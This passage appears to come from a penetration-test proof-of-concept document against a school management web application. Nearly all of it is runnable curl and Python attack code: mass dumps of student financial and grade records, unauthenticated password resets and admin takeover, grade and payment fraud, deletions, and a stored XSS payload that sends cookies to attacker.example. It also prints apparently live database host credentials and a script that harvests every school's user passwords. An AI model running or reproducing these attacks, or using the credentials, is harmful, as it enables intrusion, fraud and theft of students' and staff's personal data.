                      data={"phone": TARGET_PHONE})
    print(f"[{i+1}] {r.status_code}: {r.text[:60]}")
    time.sleep(0.5)
```

---

### PoC ST-03 — Unauthenticated Financial Data Dump (IDOR)

**Severity:** HIGH | **Auth:** None  
**Endpoint:** `GET /api/mobile/api_student_ledger_v2?studid=<ID>`

```bash
# No cookie, no session
curl -s "http://TARGET/api/mobile/api_student_ledger_v2?studid=1"
# Returns: student name, ID, grade level, program, all school fees, all payments, balance
```

**Mass enumeration:**
```python
import requests, csv

with open("financial_dump.csv", "w") as f:
    w = csv.writer(f)
    w.writerow(["studid", "sid", "fullname", "levelname", "program", "balance"])
    for sid in range(1, 2000):
        r = requests.get("http://TARGET/api/mobile/api_student_ledger_v2",
                         params={"studid": sid, "syid": 1}, timeout=5)
        if r.status_code == 200:
            d = r.json()
            if d.get("success") and d.get("student_info", {}).get("fullname", "-") != "-":
                info = d["student_info"]
                fees = sum(x.get("amount", 0) for x in d.get("school_fees", []))
                paid = sum(x.get("payment", 0) for x in d.get("school_fees", []))
                w.writerow([sid, info["sid"], info["fullname"], info["levelname"],
                            info["program_name"], fees - paid])
                print(f"[+] {info['fullname']}: balance ₱{fees-paid}")
```

---

### PoC ST-04 — Unauthenticated Grade Report Card Dump

**Severity:** HIGH | **Auth:** None

```bash
curl -s "http://TARGET/api/mobile/api_reportcard_v2?studid=42&syid=1"
# Full grade data for student 42
```

```python
import requests
for studid in range(1, 500):
    r = requests.get("http://TARGET/api/mobile/api_reportcard_v2",
                     params={"studid": studid, "syid": 1}, timeout=5)
    if r.status_code == 200 and r.json():
        print(f"[+] studid={studid}: {len(r.json())} subjects")
```

---

### PoC ST-05 — Password Harvesting from Audit Log

**Severity:** HIGH | **Auth:** Student login + DB read access

1. As a student, submit the pre-enrollment form with a password in the payload:
```bash
curl -X POST \
  -b "laravel_session=<STUDENT_SESSION>" \
  -d "syid=1&semid=1&gradelevelid=1&input_setup_type=1&password=MyPlaintextPassword123&admissiontype=1" \
  "http://TARGET/student/preenrollment/submit"
```

2. In the `updatelogs` table, the SQL column now contains the plaintext password appended after the JSON:
```sql
SELECT sql FROM updatelogs ORDER BY id DESC LIMIT 1;
-- [{"query":"update studinfo...","bindings":[1,123],"time":4.5}]MyPlaintextPassword123
```

Any DB read (backup, phpMyAdmin, SA-01) reveals these passwords.

---

---

## Module 6 — Registrar Portal

---

### PoC R-01 — Unauthenticated Mass Account Creation

**Severity:** CRITICAL | **Auth:** None  
**Endpoint:** `GET /fixAccountConflict`

```bash
# Step 1: Enumerate student IDs with missing accounts (no auth)
curl -s "http://TARGET/studentUserDebugger" | grep -o 'sid="[0-9]*"'

# Step 2: Trigger mass account creation — creates password=123456 for all missing accounts
curl -s "http://TARGET/fixAccountConflict"

# Step 3: Login as any student with the default password
TOKEN=$(curl -s "http://TARGET/login" | grep -oP 'csrf-token" content="\K[^"]*')
curl -s -c cookies.txt \
  -X POST "http://TARGET/login" \
  --data-urlencode "_token=$TOKEN" \
  --data-urlencode "email=S1001" \
  --data-urlencode "password=123456"

# Step 4: Access student portal
curl -s -b cookies.txt "http://TARGET/studentdashboard"
curl -s -b cookies.txt "http://TARGET/student/billing/summary"
```

---

### PoC R-02 — Unauthenticated Student Database Enumeration

**Severity:** CRITICAL | **Auth:** None  
**Endpoint:** `GET /studentUserDebugger`

```bash
curl -s "http://TARGET/studentUserDebugger" | grep -oE '(S|P)[0-9]+|[A-Z][a-z]+ [A-Z][a-z]+'
```

```python
import requests
from bs4 import BeautifulSoup

r = requests.get("http://TARGET/studentUserDebugger")
soup = BeautifulSoup(r.text, "html.parser")
for row in soup.select("table tbody tr"):
    cells = row.find_all("td")
    if cells:
        print(f"SID: {cells[0].text.strip()}, Name: {cells[1].text.strip()}, NSA: {cells[3].text.strip()}")
```

---

### PoC R-03 — Unauthenticated Enrollment Manipulation

**Severity:** HIGH | **Auth:** None

```bash
# Mark any student as pre-enrolled (no auth)
curl -s "http://TARGET/pre/enrollment/submit?studid=42"
# Response: [{"status":1,"data":"Submitted Successfully!"}]

# Insert false early enrollment record
curl -s "http://TARGET/early/enrollment/submit?studid=42&syid=1&semid=1&levelid=7"

# Bulk — mark 100 students as pre-enrolled
for SID in $(seq 1000 1100); do
    curl -s "http://TARGET/pre/enrollment/submit?studid=$SID" &
done; wait
```

---

### PoC R-04 — Student Deletes Academic Configuration (RegistrarV2)

**Severity:** HIGH | **Auth:** Any login  
**Route prefix:** `/registrarv2/*`

```bash
# Any authenticated session — student, teacher, parent, cashier
SESSION="<ANY_SESSION>"

# Read college list (confirms access)
curl -b "laravel_session=$SESSION" "http://TARGET/registrarv2/setup/higher-education/colleges"

# Destructive — delete college ID 1
curl -b "laravel_session=$SESSION" -X DELETE \
     "http://TARGET/registrarv2/setup/higher-education/colleges/1"

# Destructive — delete grading setup
curl -b "laravel_session=$SESSION" -X POST \
     -H "Content-Type: application/json" -d '{"id": 1}' \
     "http://TARGET/registrarv2/grading-setup/delete"
```

---

### PoC R-05 — Stored XSS via Student Name in Registrar Search

**Severity:** HIGH | **Auth:** Public pre-registration form (no login needed to inject)

```bash
# Inject XSS via public pre-registration (unauthenticated)
TOKEN=$(curl -s "http://TARGET/prereg/newstudent" | grep -oP 'name="_token" value="\K[^"]*')

curl -s -X POST "http://TARGET/storeprereg/newstudent" \
  --data-urlencode "_token=$TOKEN" \
  --data-urlencode 'firstname=<img src=x onerror=fetch("https://attacker.example/steal?c="+document.cookie)>' \
  --data-urlencode "lastname=Smith" \
  --data-urlencode "gender=M" \
  --data-urlencode "levelid=1" \
  --data-urlencode "gradeSection=1"
```

When any registrar staff searches for "Smith", the XSS payload executes in their browser — sending the registrar's session cookie to the attacker.

---

### PoC R-06 — Pre-Registration Spam

**Severity:** MEDIUM | **Auth:** None

```python
import requests, re, random, string

s = requests.Session()
r = s.get("http://TARGET/prereg/newstudent")
token = re.search(r'name="_token" value="([^"]+)"', r.text)
token = token.group(1) if token else ""

for i in range(100):
    s.post("http://TARGET/storeprereg/newstudent", data={
        "_token": token,
        "firstname": "Juan" + "".join(random.choices(string.digits, k=4)),
        "lastname": "Dela Cruz",
        "gender": "M", "levelid": "1", "gradeSection": "1"
    })
    print(f"[{i+1}] Submitted")
```

---

---

## Module 7 — College Portal

---

### PoC C-01 — Unauthenticated Grade Corruption + Column Injection

**Severity:** CRITICAL | **Auth:** None  
**Endpoint:** `GET /teacher/update/hps?a=<grades.id>&b=<column>&c=<value>`

```bash
# Set quarterly grade to perfect (no auth)
curl -s "http://TARGET/teacher/update/hps?a=1&b=qg&c=100"

# Set quarterly grade to failing minimum
curl -s "http://TARGET/teacher/update/hps?a=1&b=qg&c=65"

# Unlock a submitted grade sheet
curl -s "http://TARGET/teacher/update/hps?a=1&b=submitted&c=0"

# Zero out HPS → causes division-by-zero in grade computation
curl -s "http://TARGET/teacher/update/hps?a=1&b=pthps&c=0"
curl -s "http://TARGET/teacher/update/hps?a=1&b=wwhps0&c=0"
```

**Python — bulk corrupt all grade records:**
```python
import requests

# Step 1: Enumerate grade record IDs (unauthenticated)
grades = requests.get("http://TARGET/teacher/get/grades/5/1").json()
ids = [g["id"] for g in grades]

# Step 2: Zero out HPS on all records (causes grade computation failure)
for gid in ids:
    requests.get("http://TARGET/teacher/update/hps", params={"a": gid, "b": "pthps", "c": 0})
    requests.get("http://TARGET/teacher/update/hps", params={"a": gid, "b": "wwhps0", "c": 0})
    print(f"[*] Corrupted grades.id={gid}")

print(f"\n[!] {len(ids)} records corrupted — no login was used")
```

---

### PoC C-02 — Any Authenticated User Modifies K-12 Grade Records

**Severity:** HIGH | **Auth:** Any login  
**Endpoint:** `GET /teacher/update/grades`

```bash
# As a student — set all grade components to maximum scores
curl -s -b "laravel_session=<ANY_SESSION>" "http://TARGET/teacher/update/grades" \
  -G \
  --data-urlencode "inputedData[0][0]=<gradesdetail_id>" \
  --data-urlencode "inputedData[0][1]=10" \
  --data-urlencode "inputedData[0][2]=10" \
  --data-urlencode "inputedData[0][11]=100" \
  --data-urlencode "inputedData[0][21]=100" \
  --data-urlencode "inputedData[0][25]=100" \
  --data-urlencode "inputedData[0][26]=100" \
  --data-urlencode "inputedDataHPS[0][0]=<grades_id>"
# Response: "1" (success)
```

---

### PoC C-03 — Student Self-Approves and Posts Own Final Grade

**Severity:** HIGH | **Auth:** Student login  
**Full chain — save → submit → approve → post:**

```bash
SESSION="<STUDENT_SESSION>"

# Step 1: Save a perfect final grade for yourself
curl -s -b "laravel_session=$SESSION" \
  "http://TARGET/college/student/grade/save?\
studid=1001&subjid=3&field=finalgrade&grade=1.0&syid=1&semid=1"

# Step 2: Submit to ECR
curl -s -b "laravel_session=$SESSION" \
  "http://TARGET/college/grade/ecr/submit?id=<headerid>&syid=1&semid=1&schedid=5&term=FINAL"

# Step 3: Approve (should require Chairperson — anyone can do it)
curl -s -b "laravel_session=$SESSION" \
  "http://TARGET/college/grade/ecr/approve?id=<headerid>&syid=1&semid=1&schedid=5&term=FINAL"

# Step 4: Post to permanent record (should require Dean — anyone can do it)
curl -s -b "laravel_session=$SESSION" \
  "http://TARGET/college/grade/ecr/post?id=<headerid>&syid=1&semid=1&schedid=5&term=FINAL"

# Result: college_exlgrade.status = 4 (POSTED) — student's self-assigned 1.0 is now official
```

---

### PoC C-04 — Student Removes Subject from College Curriculum

**Severity:** HIGH | **Auth:** Any login

```bash
# Any session — student, teacher, parent
curl -s -b "laravel_session=<ANY_SESSION>" \
  "http://TARGET/dean/remove/prospectussubject/1"
# Subject ID 1 removed from prospectus — enrolled students have inconsistent graduation checklist

# Add a fake subject to curriculum
curl -s -b "laravel_session=<ANY_SESSION>" \
  "http://TARGET/dean/store/prospectus?subjectID=99&courseID=1&yearID=1&semesterID=1&units=3"
```

---

### PoC C-05 — Unauthenticated Grade Status Submission

**Severity:** HIGH | **Auth:** None

```bash
# Submit grade status without login
curl -s "http://TARGET/college/student/grade/status/submit?statusid=<id>&datafield=<value>"

# Combined C-01 + C-05 chain
curl -s "http://TARGET/teacher/update/hps?a=1&b=qg&c=100"
curl -s "http://TARGET/college/student/grade/status/submit?statusid=1&datafield=submitted"
```

---

### PoC C-06 — Unauthenticated Grade Dump

**Severity:** HIGH | **Auth:** None

```bash
# College grades for section 5, subject 3 — no login
curl -s "http://TARGET/college/subject/students?syid=1&semid=1&sectionid=5&subjid=3"

# K-12 grade dump for section 5 (also unauthenticated)
curl -s "http://TARGET/teacher/get/grades/5/1"
```

---

---

## Module 8 — Parent Portal

---

### PoC P-01 — Student Bypasses `isParent` Middleware

**Severity:** HIGH | **Auth:** Student login

```bash
# Login as student (type=7)
TOKEN=$(curl -s "http://TARGET/login" | grep -oP 'name="_token" value="\K[^"]*')
curl -s -c s_cookies.txt \
  -X POST "http://TARGET/login" \
  --data-urlencode "_token=$TOKEN" \
  --data-urlencode "email=S1001" \
  --data-urlencode "password=<student_password>"

# Access parent-only endpoints with student session — isParent bypassed entirely
curl -s -b s_cookies.txt \
  "http://TARGET/parent/enrollment/record/grades?syid=1&semid=1&sectionid=5&levelid=8"
curl -s -b s_cookies.txt "http://TARGET/parent/enrollment/billing?syid=1&semid=1"
curl -s -b s_cookies.txt "http://TARGET/parent/enrollment/ledger?syid=1&semid=1"
curl -s -b s_cookies.txt "http://TARGET/parent/enrollment/record/attendance?syid=1"
```

---

### PoC P-02 — Fake Online Payment with Negative Amount

**Severity:** HIGH | **Auth:** Any session with `studentInfo` (student or parent login)

```bash
# Create a minimal valid JPEG (1x1 pixel)
python3 -c "
b=bytes([0xFF,0xD8,0xFF,0xE0,0x00,0x10,0x4A,0x46,0x49,0x46,0x00,0x01,0x01,0x00,0x00,0x01,0x00,0x01,0x00,0x00,0xFF,0xD9])
open('/tmp/receipt.jpg','wb').write(b)"

# Submit negative payment — no amount validation
curl -s -b s_cookies.txt \
  -X POST "http://TARGET/parentEnterAmount" \
  -F "paymentType=1" \
  -F "recieptImage=@/tmp/receipt.jpg" \
  -F "amount=-5000" \
  -F "studid=1001" \
  -F "refNum=FAKE-$(date +%s)" \
  -F "transDate=2026-06-11" \
  -F "_token=<CSRF>"
# Response: [{"status":"1","message":"SUCCESS"}]
# Record inserted: onlinepayments with amount=-5000 — reduces student balance if approved
```

---

### PoC P-03 — Combined Chain: Unauthenticated → Account → Payment Fraud

```bash
# Step 1: Create parent accounts (R-01 — no auth)
curl -s "http://TARGET/fixAccountConflict"

# Step 2: Login as parent P1001 / 123456
TOKEN=$(curl -s "http://TARGET/login" | grep -oP 'name="_token" value="\K[^"]*')
curl -s -c chain.txt \
  -X POST "http://TARGET/login" \
  --data-urlencode "_token=$TOKEN" \
  --data-urlencode "email=P1001" \
  --data-urlencode "password=123456"

# Step 3: Read full billing ledger
curl -s -b chain.txt "http://TARGET/parent/enrollment/ledger?syid=1&semid=1"

# Step 4: Submit fraudulent payment
curl -s -b chain.txt \
  -X POST "http://TARGET/parentEnterAmount" \
  -F "paymentType=1" -F "recieptImage=@/tmp/receipt.jpg" \
  -F "amount=-10000" -F "studid=1001" \
  -F "refNum=FRAUD-$(date +%s)" -F "transDate=2026-06-11" \
  -F "_token=<CSRF>"

echo "[+] Full chain complete: unauthenticated → parent account → billing view → fraudulent record"
```

---

---

## Module 9 — Admin Portal

---

### PoC A-01 — Unauthenticated Password Reset for Any Account

**Severity:** CRITICAL | **Auth:** None  
**Endpoint:** `GET /administrator/setup/accounts/updatepass?tid=<email>`

```bash
# Reset a specific account to password "123456"
curl "http://TARGET/administrator/setup/accounts/updatepass?tid=admin@school.edu"
# Response: [{"status":1,"message":"Account Reset"}]

# Reset all known admin-pattern accounts
for EMAIL in admin registrar finance cashier principal superadmin; do
    curl -s "http://TARGET/administrator/setup/accounts/updatepass?tid=${EMAIL}@school.edu"
    echo "Reset: ${EMAIL}@school.edu"
done

# Reset teacher accounts by TID pattern (year + sequential number)
YEAR=2026
for i in $(seq 1 500); do
    TID="${YEAR}$(printf '%04d' $i)"
    curl -s "http://TARGET/administrator/setup/accounts/updatepass?tid=${TID}" \
         -o /dev/null -w "%{http_code} ${TID}\n"
done
```

---

### PoC A-02 — Unauthenticated Plaintext Password Dump

**Severity:** CRITICAL | **Auth:** None  
**Endpoint:** `GET /administrator/setup/accounts/list`

```bash
# Dump all staff with plaintext passwords
curl "http://TARGET/administrator/setup/accounts/list?status=1&length=9999&start=0" \
  | python3 -c "
import sys, json
data = json.load(sys.stdin)
for row in data.get('data', []):
    for u in row.get('user', []):
        if u.get('passwordstr'):
            print(f\"{u['email']}:{u['passwordstr']}\")
"
```

Sample output:
```
20260001:SecureP@ss1
20260002:Welcome123
admin@school.edu:AdminPass2026
```

---

### PoC A-03 — Unauthenticated Account Creation with Arbitrary Role

**Severity:** CRITICAL | **Auth:** None  
**Endpoint:** `GET /administrator/setup/accounts/create/account`

```bash
# Create account with type=6 (Admin) — no authentication
curl "http://TARGET/administrator/setup/accounts/create/account?\
lname=Attacker&fname=Test&mname=&title=Mr&acadtitle=&suffix=\
&lcn=&utype=6&userid=1&bdate=1990-01-01&gender=M&national=1\
&marital=1&mobile=09000000000&email=attacker@evil.com&address=123+Street"
# Response: [{"status":1,"data":"Created Successfully!"}]

# Get the generated TID from the list endpoint
curl "http://TARGET/administrator/setup/accounts/list?length=1&start=0&status=1" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d['data'][-1]['tid'])"

# Login: email=<TID> / password=123456
```

---

### PoC A-04 — Unauthenticated Portal Privilege Grant

**Severity:** HIGH | **Auth:** None

```bash
# Grant SuperAdmin (type 17) portal access to user ID 42 — with forged audit trail
curl "http://TARGET/administrator/setup/accounts/update/privilege?\
userid=42&usertype=17&status=1&updateuserid=1"

# Remove access from a legitimate admin (lockout)
curl "http://TARGET/administrator/setup/accounts/update/privilege?\
userid=5&usertype=6&status=0&updateuserid=99"
```

---

### PoC A-05 — Unauthenticated Mass Account Deactivation

**Severity:** HIGH | **Auth:** None

```bash
# Deactivate all teachers (IDs 1–500)
for i in $(seq 1 500); do
    curl -s "http://TARGET/administrator/setup/accounts/update/active?teacher=${i}&status=0"
done
echo "[!] All teacher accounts deactivated"
```

---

### PoC A-06 — Unauthenticated K-12 Grade Approval and Posting

**Severity:** HIGH | **Auth:** None

```bash
GRADE_STATUS_ID=42

# Approve the grade batch (no middleware)
curl "http://TARGET/reportcard/grade/status/approve?id=${GRADE_STATUS_ID}"

# Post grades to permanent record (no middleware)
curl "http://TARGET/reportcard/grade/status/post?id=${GRADE_STATUS_ID}"
```

---

### PoC A-07 — Unauthenticated Database Sync Delete

**Severity:** HIGH | **Auth:** None

```bash
curl "http://TARGET/administrator/setup/accounts/syncdelete?teacher=1"
curl "http://TARGET/administrator/setup/accounts/syncdelete?teacher=2"
```

---

### PoC A-08 — Full Takeover Automation (A-01 + Login Chain)

```python
#!/usr/bin/env python3
"""
Admin portal full takeover — A-01 password reset + automatic login.
For authorized penetration testing only.
"""
import requests, re, sys

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost"
s = requests.Session()

candidates = [
    "admin@school.edu", "superadmin@school.edu",
    "registrar@school.edu", "principal@school.edu",
]

for email in candidates:
    # Step 1: Reset password (no auth required)
    r = requests.get(f"{TARGET}/administrator/setup/accounts/updatepass",
                     params={"tid": email})
    try:
        result = r.json()
    except: continue

    if result[0].get("status") == 1:
        print(f"[+] Password reset: {email}")

        # Step 2: Get CSRF token
        login_page = s.get(f"{TARGET}/login")
        token = re.search(r'_token.*?value="([^"]+)"', login_page.text)
        csrf = token.group(1) if token else ""

        # Step 3: Login
        login = s.post(f"{TARGET}/login", data={
            "_token": csrf,
            "email": email,
            "password": "123456",
        })

        if "dashboard" in login.url or "home" in login.url:
            print(f"[+] LOGIN SUCCESS as {email}")
            print(f"[+] Session: {dict(s.cookies)}")
            break
    else:
        print(f"[-] {email}: not found")
```

---

---

## Module 10 — Principal Portal

---

### PoC PR-01 — Any Authenticated User Reads Principal-Only Data

**Severity:** CRITICAL | **Auth:** Any login (even student)

```bash
# Log in as any user
curl -c cookies.txt -X POST "http://TARGET/login" \
     -d "email=20260001&password=<any_password>&_token=<csrf>"

# Read enrolled student list for any section
curl -b cookies.txt "http://TARGET/principal/section/students/enrolled?\
section=1&acad=3&syid=2&gradelevel=7"

# Read grade submission status for all sections
curl -b cookies.txt "http://TARGET/principal/grades/status?\
syid=2&section=1&levelid=7&acadprogid=3"

# Read SF9 signatory names (name printed on all report cards)
curl -b cookies.txt "http://TARGET/setup/signatories/list/sf9?syid=2"
# Returns: [{"id":1,"name":"Maria Santos","title":"School Principal","acadprogid":3}]

# Read student honors/rankings with general averages
curl -b cookies.txt "http://TARGET/searchStudentWithHonors?\
gradelevel=7&sy=2&quarter=1&section=1"
```

---

### PoC PR-02 — Unauthenticated Deportment Grade Status Write

**Severity:** CRITICAL | **Auth:** None  
**Endpoints:** `GET /posting/grade/update-grade-status` and `GET /posting/grade/update-stud-gradstatus`

```bash
# Set conduct grades for students 10, 11, 12 to status=5 (Posted) — no login
curl "http://TARGET/posting/grade/update-grade-status" \
     -G \
     --data-urlencode "array[]=10" \
     --data-urlencode "array[]=11" \
     --data-urlencode "array[]=12" \
     --data-urlencode "syid=2" \
     --data-urlencode "sectionid=3" \
     --data-urlencode "quarter_ID=1" \
     --data-urlencode "status=5" \
     --data-urlencode "hpsid=1"
# Response: [{"status":200,"statusCode":"success","message":"Succesfully Approved!"}]

# Reset individual student conduct grade to "Not Submitted" (no login)
curl "http://TARGET/posting/grade/update-stud-gradstatus?\
studid=<deportment_id>&sy=2&quarter=1&status=1"
```

**Bulk reset all deportment records (denial of service):**
```python
import requests

for studid in range(1, 500):
    r = requests.get("http://TARGET/posting/grade/update-stud-gradstatus",
                     params={"studid": studid, "sy": 2, "quarter": 1, "status": 1})
    if r.status_code == 200:
        print(f"[+] Reset deportment {studid}")
```

---

### PoC PR-03 — Authenticated User Posts and Approves Own Grades

**Severity:** HIGH | **Auth:** Any account with changed password (non-default)

```bash
SESSION="<NON_DEFAULT_PASSWORD_SESSION>"

# Approve any grade submission (no principal role required)
curl -b "laravel_session=$SESSION" \
     "http://TARGET/posting/grade/approve?gdid=123&studid=55&quarter=2&syid=2&semid=1"

# Post grades to permanent record
curl -b "laravel_session=$SESSION" \
     "http://TARGET/posting/grade/post?gdid=123&studid=55&quarter=2&syid=2&semid=1"

# Subject-level approval (no student ID needed)
curl -b "laravel_session=$SESSION" \
     "http://TARGET/posting/grade/subject/approve?gdid=123&teacherid=45"

curl -b "laravel_session=$SESSION" \
     "http://TARGET/posting/grade/subject/post?gdid=123&teacherid=45"
```

---

### PoC PR-04 — Any Authenticated User Overwrites SF9 Report Card Signatory

**Severity:** HIGH | **Auth:** Any login (including student)

```bash
SESSION="<STUDENT_SESSION>"

# Step 1: Find current signatories
curl -b "laravel_session=$SESSION" "http://TARGET/setup/signatories/list/sf9?syid=2"

# Step 2: Overwrite the principal name printed on all SF9 report cards
curl -b "laravel_session=$SESSION" \
     "http://TARGET/setup/signatories/update/sf9?\
id=1&name=Hacked%20User&title=Unauthorized%20Principal&acadprogid=3&syid=2"
# All subsequent SF9 report cards now print "Hacked User / Unauthorized Principal"

# Delete all signatories (SF9 forms print blank name)
for ID in 1 2 3 4 5; do
    curl -b "laravel_session=$SESSION" \
         "http://TARGET/setup/signatories/delete/sf9?id=${ID}"
done
```

---

### PoC PR-05 — IDOR in Section Profile via Unhandled Decrypt Exception

**Severity:** MEDIUM | **Auth:** Any login

```python
import requests

COOKIES = {"laravel_session": "<SESSION>"}

for section_id in range(1, 200):
    r = requests.get(f"http://TARGET/principalPortalSectionProfile/{section_id}",
                     cookies=COOKIES, allow_redirects=False)
    if r.status_code == 200 and "sectionname" in r.text.lower():
        print(f"[+] Section {section_id}: found ({len(r.text)} bytes)")
    else:
        print(f"[-] Section {section_id}: {r.status_code}")
```

---

### PoC PR-01 Extended — Full Principal Workflow Takeover

```python
import requests, re

TARGET  = "http://TARGET"
s = requests.Session()

# Login as teacher (non-principal — any changed-password account)
login_page = s.get(f"{TARGET}/login")
csrf = re.search(r'name="_token"\s+value="([^"]+)"', login_page.text).group(1)
s.post(f"{TARGET}/login", data={"email": "20260045", "password": "MyNewPassword", "_token": csrf})
print("[+] Logged in as teacher (no principal role)")

# Read grade status for all sections
grades_page = s.get(f"{TARGET}/principal/grades/status",
                    params={"syid": "2", "section": "1", "levelid": "7", "acadprogid": "3"})
print(f"[+] Grade status page: {len(grades_page.text)} bytes")

# Approve and post all grades — replace gdids with IDs from the grades page
for gdid in [120, 121, 122]:
    r = s.get(f"{TARGET}/posting/grade/approve",
              params={"gdid": gdid, "studid": 1, "quarter": 2, "syid": 2})
    print(f"[+] Approved {gdid}: {r.json()}")

    r = s.get(f"{TARGET}/posting/grade/post",
              params={"gdid": gdid, "studid": 1, "quarter": 2, "syid": 2})
    print(f"[+] Posted {gdid}: {r.json()}")

print("[+] All grades approved and posted — no principal authorization used")
```

---

---

## Module 11 — Director Portal

---

### PoC DR-01 — Direct Database Access via Hardcoded Credentials

**Severity:** CRITICAL (CVSS 10.0) | **Auth:** MySQL client only (no web access needed)

Credentials extracted from `DirectorFinanceReportsController.php` (appears 4×):
```
Host:     141.164.36.7
Port:     3306
Username: ckgroup_dev
Password: Sels2019
```

```bash
# Direct MySQL connection — bypasses the entire web application
mysql -h 141.164.36.7 -P 3306 -u ckgroup_dev -p'Sels2019'

# Enumerate all school databases on the hosted platform
SHOW DATABASES;

# Extract all user credentials from a specific school
USE <school_db_name>;
SELECT email, password, passwordstr, type FROM users;
```

---

### PoC DR-02 — Unauthenticated Employee PII Dump

**Severity:** CRITICAL | **Auth:** None  
**Endpoint:** `GET /passData?action=getemployees`

```bash
# Full employee PII — completely unauthenticated
curl "http://TARGET/passData?action=getemployees" | python3 -m json.tool
# Returns: name, gender, DOB, home address, email, employment status,
#          hire date, education history, portal access privileges, attendance
```

**Automated full data export:**
```python
import requests, json

TARGET  = "http://TARGET"
ACTIONS = ["getschoolyears", "getsemesters", "getpaymenttypes", "getterminals",
           "getemployees", "getemployeeattendance", "getfinancestudents"]

for action in ACTIONS:
    r = requests.get(f"{TARGET}/passData", params={"action": action})
    if r.status_code == 200:
        data = r.json()
        print(f"[+] {action}: {len(data)} records")
        with open(f"dump_{action}.json", "w") as f:
            json.dump(data, f, indent=2, default=str)
```

---

### PoC DR-03 — Unauthenticated Director Finance Dashboards

**Severity:** CRITICAL | **Auth:** None

```bash
# All Director finance dashboards — no credentials
curl -v "http://TARGET/director/finance/cashiertransactionsindex"
curl    "http://TARGET/director/finance/collectionsindex"
curl    "http://TARGET/director/finance/accountreceivablesindex"
curl    "http://TARGET/director/finance/expensesindex"

# AdminAdmin management dashboards — no credentials
curl "http://TARGET/finance/index"
curl "http://TARGET/hr/index"
curl "http://TARGET/academic/index"
curl "http://TARGET/enrollmentReport"
```

---

### PoC DR-04 — Full Multi-School Database Compromise Chain

```python
#!/usr/bin/env python3
"""
Full Director impact chain:
Hardcoded credentials → direct DB access → enumerate all schools → dump all credentials
"""
import pymysql, json, sys

CREDS = {"host": "141.164.36.7", "port": 3306,
         "user": "ckgroup_dev", "password": "Sels2019"}

print("[*] Connecting to production database server...")
conn = pymysql.connect(**CREDS)
cursor = conn.cursor(pymysql.cursors.DictCursor)

# Enumerate all school databases
cursor.execute("SHOW DATABASES")
dbs = [r["Database"] for r in cursor.fetchall()
       if r["Database"] not in ("information_schema", "mysql", "performance_schema", "sys")]
print(f"[+] Found {len(dbs)} school databases: {', '.join(dbs)}")

# Extract credentials from every school
all_creds = {}
for db in dbs:
    try:
        cursor.execute(f"USE `{db}`")
        cursor.execute("SELECT email, password, passwordstr, type FROM users WHERE deleted=0")
        rows = cursor.fetchall()
        all_creds[db] = rows
        plain = sum(1 for r in rows if r.get("passwordstr"))
        print(f"[+] {db}: {len(rows)} accounts ({plain} with plaintext passwords)")
    except Exception as e:
        print(f"[-] {db}: {e}")

conn.close()

with open("all_schools_credentials.json", "w") as f:
    json.dump(all_creds, f, indent=2, default=str)

total = sum(len(v) for v in all_creds.values())
print(f"\n[+] Total accounts extracted: {total}")
print(f"[+] Saved to all_schools_credentials.json")
```

---

---

## Quick Reference — Unauthenticated Critical Endpoints

| Endpoint | Module | Impact |
|---|---|---|
| `GET /synchornization/process/updatelogs?query=<SQL>` | SuperAdmin | Execute arbitrary SQL |
| `GET /cloudNewData/{table}/0` | SuperAdmin | Read any DB table |
| `GET /insertdatatotable?table=users&data={...}` | SuperAdmin | Write any DB table |
| `GET /storeImage?imagepath=file:///…` | SuperAdmin | Read any server file (LFI) |
| `GET /gradesdetail/update` | Teacher | Modify any student's component grade |
| `GET /gradesheader/update` | Teacher | Approve any grade header |
| `GET /grades/report/mastersheet` | Teacher | Dump all student grades |
| `GET /teacher/update/hps` | College | Corrupt any grade (column injection) |
| `GET /posting/grade/update-grade-status` | Principal | Write deportment status |
| `GET /reportcard/grade/status/approve` | Admin | Approve K-12 grade batch |
| `GET /reportcard/grade/status/post` | Admin | Post K-12 grade batch |
| `GET /administrator/setup/accounts/updatepass` | Admin | Reset any account password to `123456` |
| `GET /administrator/setup/accounts/list` | Admin | Dump all plaintext passwords |
| `GET /administrator/setup/accounts/create/account` | Admin | Create account with any privilege level |
| `GET /fixAccountConflict` | Registrar | Create student/parent accounts (pw=`123456`) |
| `GET /studentUserDebugger` | Registrar | Enumerate all student IDs and names |
| `GET /early/enrollment/submit` | Registrar | Manipulate enrollment records |
| `GET /passData?action=getemployees` | Director | Dump all employee PII |
| `GET /director/finance/cashiertransactionsindex` | Director | View all finance dashboards |
| `POST /student/notify_individual_student` | Student | Send SMS to any phone number |
| `GET /api/mobile/api_student_ledger_v2` | Student | Read any student's financial data |
| `GET /api/mobile/api_reportcard_v2` | Student | Read any student's grades |
| `POST /parentEnterAmount` | Parent | Insert fake payment record (negative amounts accepted) |

---

*End of Unified PoC Document*  
*Individual per-module documents (ADMIN_POC.md, TEACHER_POC.md, etc.) available in `Analysis Docs/`*
